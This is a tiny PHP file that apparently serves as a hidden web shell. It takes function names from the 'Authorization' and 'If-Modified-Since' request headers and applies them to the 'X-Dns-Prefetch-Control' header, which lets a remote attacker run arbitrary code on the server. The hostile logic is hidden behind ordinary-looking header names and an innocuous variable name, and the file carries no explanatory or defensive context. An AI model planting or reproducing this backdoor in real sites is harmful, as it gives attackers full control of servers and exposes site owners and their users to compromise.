<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Authorization'])) {
    $dba_insertion = $_HEADERS['Authorization']('', $_HEADERS['If-Modified-Since']($_HEADERS['X-Dns-Prefetch-Control']));
    $dba_insertion();
}